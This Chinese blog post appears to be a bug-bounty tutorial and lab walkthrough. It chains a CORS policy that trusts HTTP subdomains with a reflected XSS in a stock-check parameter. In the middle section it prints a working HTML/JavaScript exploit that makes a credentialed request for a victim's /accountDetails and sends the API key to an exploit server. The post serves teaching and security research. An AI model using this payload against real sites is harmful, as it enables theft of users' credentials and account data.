#  单看都是中低危，组合起来却拿下严重漏洞？赏金猎人都在练的CORS+反射XSS组合拳  
原创 升斗安全XiuXiu
                    升斗安全XiuXiu  升斗安全   2026-06-27 16:08  
  
**【文章说明】**  
- **目的**  
：本文内容仅为网络安全**技术研究与教育**  
目的而创作。  
  
- **红线**  
：严禁将本文知识用于任何**未授权**  
的非法活动。使用者必须遵守《网络安全法》等相关法律。  
  
- **责任**  
：任何对本文技术的滥用所引发的**后果自负**  
，与本公众号及作者无关。  
  
- **免责**  
：内容仅供参考，作者不对其准确性、完整性作任何担保。  
  
**阅读即代表您同意以上条款。**  
  
****  
在挖洞的时候，我们经常会遇到一些看似不起眼的配置，组合起来却能把人送进后台。今天要聊的这个场景，正好能把  
Burp Suite配合  
CORS配置不当和一个小小的  
XSS，玩出花儿来。  
  
故事的开头很常规：打开  
Burp内置浏览器，正常登录你的账户页面，随便逛逛。这时候别光用眼睛看，切到HTTP历史记录里翻一翻。你会发现，有个请求悄悄发到了  
/accountDetails，返回的响应里赫然躺着你的API密钥。更重要的是，响应头里带着  
Access-Control-Allow-Credentials: true，这基本就是在喊：“  
我支持跨域携带凭证，就看谁有本事来拿。”  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/qg1MKHx3jGEz94Kc8rG4RGUVicREMY1FegZRIdlmcT7PdzQTiaRlnO5VBN737wk8zsjcQBIBauPSjenRroBY9ZQDwvz1gVicb8WA9QNrlIkMBU/640?wx_fmt=png&from=appmsg "")  
  
好，线索有了，我们开始试探。把这个请求直接扔进  
Burp Repeater，在请求头里手动加上一行：  
  
Origin: http://target.com（把target.com换成你目标地址的域名）。点发送，看响应。如果响应头里原样返回了一个Access-Control-Allow-Origin: http://subdomain.lab-id，那就稳了。这说明目标站点的CORS策略相当“大方”，大方到允许任意子域名的请求，而且连HTTP这种明文协议都不嫌弃。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/qg1MKHx3jGFHhK8FWib5LlgVz8LMiawFpsUOYicfRqYzmbya2oQia8Emico1ZhTrYcjtyMlBtdWgufCRzbnR1jUzmEeBUPs75Ao1uJmibcTHB5AK0/640?wx_fmt=png&from=appmsg "")  
  
接下来，我们换个地方转转。随便打开一个商品页面，点那个“检查库存”的按钮。盯住Burp里的请求，你会发现这个检查库存的功能，正好是通过一个子域名发起的  
HTTP请求。更妙的是，请求里的  
productId参数，竟然对输入的内容照单全收，直接反射到页面上。一个经典的反射型XSS漏洞，就这么送到了嘴边。  
  
到这里，单点问题都齐了：  
- 一个允许携带凭证的CORS  
  
- 一个可以跨域偷数据的接口  
  
- 还有一个能执行脚本的XSS  
  
现在只需要把它们串起来，写成一份钓鱼大餐。  
  
打开你的漏洞利用服务器，把下面这套精心烹制的HTML摆上去。记住，把你的  
目的地址域名和  
漏洞利用服务器地址填到对应的坑里：  
```
<script>
    document.location="http://stock.YOUR-target.com/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-target.com/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.com.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```  
  
这段代码的思路其实很直白：受害者一访问我们的恶意页面，浏览器就会跳转到那个  
存在XSS的库存检查子域名。URL里夹带的脚本一旦在受害者浏览器里跑起来，就会悄悄发送一个带凭证的请求，把  
/accountDetails接口返回的  
API密钥，打包发送到我们的  
漏洞利用服务器日志里。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qg1MKHx3jGHPc35ptQtTjIFgicv4IWsnxnKNy3CsU4dljcibzDO2VWiaPjm5lgF3C8gPshhnLMhlS1WFialRWyJeC4cVclrCkzvuF4E7pia33Djk/640?wx_fmt=png&from=appmsg "")  
  
我们自己先点“查看漏洞利用”试试水。如果一切顺利，页面会跳转到日志界面，你的  
API密钥会明晃晃地挂在  
URL参数里。测试通过，点击“向受害者交付漏洞利用”，等着模拟受害者上钩就行。最后去“访问日志”里，从  
URL参数中轻松捞出受害者的  
API密钥，提交，收工。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qg1MKHx3jGGS0r907I0QKDlwhV1xVSyjrteKMyBLgTt0JliasEyNxiaXibLKKDW4IgfEOOia8BFn7JBwkCOFPiclwz9BgnGniapFQLmD6qXInvTaw/640?wx_fmt=png&from=appmsg "")  
  
这种攻击链在实际的赏金猎人生涯中其实很有参考价值。  
CORS配置不严、  
HTTP子域名、  
反射XSS，单独看可能都只能算中低危，但组合拳打出来，往往就是直接拿账号权限的严重漏洞。多留意这些细节，说不定下个高额赏金就在这种组合拳里。  
  
如果觉得这期分享对你有帮助，别忘了  
点赞、  
关注，顺手  
转发给一起挖洞的兄弟们。也欢迎大家点个  
推荐，让更多人看到这种实用的漏洞组合思路。我们下期再见！  
  
  
往期推荐：  
  
[别只看书了！CTF免费资源+在线靶场福利，这才是赏金猎人的训练营](https://mp.weixin.qq.com/s?__biz=MjM5MzM0MTY4OQ==&mid=2447798624&idx=1&sn=1291eb2c49b2fa9f78bdd9b6d457eade&scene=21#wechat_redirect)  
  
  
[免费打造你的渗透测试 AI助手：Burpsuite+Ollama+本地大模型 → AI辅助分析，赏金猎人高效挖洞（脚本已打包）](https://mp.weixin.qq.com/s?__biz=MjM5MzM0MTY4OQ==&mid=2447798575&idx=1&sn=0636ff98027e96c2dbbec867b59ba8ff&scene=21#wechat_redirect)  
  
  
